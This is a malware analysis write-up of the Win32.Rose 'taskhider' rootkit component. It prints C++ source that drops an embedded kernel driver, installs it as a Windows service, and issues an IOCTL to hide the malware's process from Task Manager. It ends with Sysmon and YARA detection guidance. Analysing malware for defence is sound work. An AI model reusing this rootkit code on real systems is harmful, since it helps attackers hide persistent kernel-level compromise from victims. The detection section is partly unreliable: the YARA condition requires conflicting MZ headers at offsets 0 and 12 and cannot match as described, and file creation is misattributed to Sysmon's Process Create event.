# Win32.Rose - Kernel Rootkit Process Hiding

**Repository:** MalwareSourceCode-main  
**File Path:** `Win32/Malware Families/Win32.Rose/Win32.Rose.c/Win32.Rose.c/taskhider.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1014 - Rootkit, T1543.003 - Create or Modify System Process: Windows Service

---

## Overview

The Win32.Rose malware family utilizes a kernel-mode rootkit to achieve stealth and persistence. The malware embeds a malicious driver (`msdirectx.sys`) directly within its executable. Upon execution, it drops this driver to disk, creates a new Windows service to load it into the kernel, and then starts the service. Once the driver is running, the malware communicates with it via `DeviceIoControl` calls to issue commands. The primary command, `IOCTL_ROOTKIT_HIDEME`, instructs the driver to manipulate kernel structures (specifically, the doubly-linked list of `EPROCESS` objects) to remove the malware's own process from the system's process list, effectively rendering it invisible to Task Manager and other user-mode monitoring tools.

---

## Code Snippet 1: Dropping and Installing the Kernel Driver as a Service

```cpp
// Embedded driver binary (6.6KB)
unsigned char msdirectx_sys[6656] =
{
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,  // MZ header
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // ... 6,640 more bytes ...
    0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x05, 0x00,  // PE\0\0 signature
    0xB5, 0xB1, 0x2E, 0x41, 0x00, 0x00, 0x00, 0x00,  // Timestamp: Aug 30, 2004
    // ... driver code sections ...
};

static void ExtractDriver(char *file)
{
	unsigned long byteswritten;
	HANDLE FileHandle;
	
	// Create driver file on disk
	FileHandle = CreateFile(file,
	                        GENERIC_WRITE,
	                        FILE_SHARE_WRITE,
	                        0,
	                        CREATE_ALWAYS,
	                        FILE_ATTRIBUTE_NORMAL,
	                        0);
	
	if (FileHandle == INVALID_HANDLE_VALUE) return;
	
	// Write embedded driver binary to file
	WriteFile(FileHandle, msdirectx_sys, 6656, &byteswritten, 0);
	CloseHandle(FileHandle);
	return;
}

BOOL InstallDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe )
{
    SC_HANDLE  schService;

    //
    // NOTE: This creates an entry for a standalone driver. If this
    //       is modified for use with a driver that requires a Tag,
    //       Group, and/or Dependencies, it may be necessary to
    //       query the registry for existing driver information
    //       (in order to determine a unique Tag, etc.).
    //

    schService = CreateService( 
        SchSCManager,          // SCManager database handle
        DriverName,            // Service name: "msdirectx"
        DriverName,            // Display name: "msdirectx"
        SERVICE_ALL_ACCESS,    // Desired access: Full control
        SERVICE_KERNEL_DRIVER, // Service type: Kernel driver
        SERVICE_DEMAND_START,  // Start type: Manual (on-demand)
        SERVICE_ERROR_NORMAL,  // Error control: Log errors but continue
        ServiceExe,            // Binary path: C:\Windows\System32\msdirectx.sys
        NULL,                  // Load ordering group: None
        NULL,                  // Tag identifier: None
        NULL,                  // Dependencies: None
        NULL,                  // Account: LocalSystem (default for drivers)
        NULL                   // Password: None
    );
    
    if ( schService == NULL )
        return FALSE;

    CloseServiceHandle( schService );
    return TRUE;
}

void taskhider() {
	char file[MAX_PATH];
	//extract the driver if need be
	ExtractDriver("msdirectx.sys");
	//lets load the driver
	if (InitDriver() == -1) return;
    // ... (finds its own PID) ...
}
```

**What it does:**  
The `taskhider` function first calls `ExtractDriver` to write the embedded `msdirectx_sys` byte array to a file in the current directory. It then calls `InitDriver` (a wrapper function) which uses `CreateService` to register this file as a kernel driver service. The service is configured as `SERVICE_KERNEL_DRIVER` and `SERVICE_DEMAND_START`, meaning it's a kernel-mode component that can be started on-demand.

**Why it's T1543.003:**  
This is a classic example of using a Windows Service for persistence and privilege escalation. By creating a service to load a driver, the malware ensures that its kernel-mode component can be loaded by the Service Control Manager, a trusted and high-privilege system process. This allows the malware's rootkit capabilities to be activated.

---

## Code Snippet 2: Hiding the Process via IOCTL

```cpp
#define IOCTL_ROOTKIT_HIDEME (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x02, METHOD_BUFFERED, FILE_WRITE_ACCESS)

HANDLE gh_Device = INVALID_HANDLE_VALUE; // Global handle to the driver device

DWORD HideProc(DWORD pid)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEME,
					(void *) &pid,
					sizeof(DWORD),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}

void taskhider() {
    // ... (driver extraction and loading) ...
	
    //lets list the processes to get are pid
    // ... (code to find its own process name and PID) ...
    while(ploop <= size)
	{
		if(strstr(buffer,file)!=NULL)
		{
			char *pid;
			pid = strtok(buffer,":");
			pid = strtok(NULL,":");
			if (HideProc(strtoul(pid,NULL,10))!=0) addlog("Hidden From TaskManager!");
		}
		buffer += PROCNAMELEN;
		ploop++;
	}
    // ...
}
```

**What it does:**  
After the driver is loaded, the `taskhider` function finds its own Process ID (PID). It then calls the `HideProc` function with this PID. `HideProc` uses `DeviceIoControl` to send a command (`IOCTL_ROOTKIT_HIDEME`) and the target PID to the running kernel driver. The driver receives this IOCTL and performs the actual process hiding by manipulating kernel data structures to unlink the process from the active process list.

**Why it's T1014:**  
This is the definition of a rootkit. The malware uses kernel-level execution to subvert the integrity of the operating system and hide its own presence. By sending an IOCTL to a custom driver, the user-mode component instructs the kernel-mode component to perform an action (process hiding) that is impossible from user-mode and conceals the malware's activity from standard system utilities.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 6: Driver Loaded**: Monitor for the loading of unsigned drivers or drivers with suspicious names like `msdirectx.sys`. The signature status and file path are key indicators.
- **Event ID 1: Process Create**: The creation of the `msdirectx.sys` file on disk by the malware process is a strong indicator.
- **Event ID 12 & 13 & 14: RegistryEvent (Key and Value Create/Set)**: Monitor for the creation of a new service key under `HKLM\SYSTEM\CurrentControlSet\Services\msdirectx`.

### YARA Rule

```yara
rule T1014_Rootkit_Win32_Rose_Taskhider
{
    meta:
        author = "Vengful"
        description = "Detects the embedded msdirectx.sys rootkit driver and control strings used by Win32.Rose."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1014"

    strings:
        // Embedded driver PE header
        $driver_mz = { 4D 5A 90 00 03 00 00 00 }

        // Control strings and IOCTLs
        $s1 = "msdirectx.sys" ascii
        $s2 = "msdirectx" ascii
        $s3 = "taskhider" ascii
        $ioctl1 = "IOCTL_ROOTKIT_HIDEME" ascii
        $ioctl2 = "IOCTL_ROOTKIT_INIT" ascii
        $s4 = "Hidden From TaskManager!" ascii

    condition:
        uint16(0) == 0x5A4D and // MZ header of host file
        $driver_mz at 12 and // Embedded driver header
        all of ($s*) and
        1 of ($ioctl*)
}
```
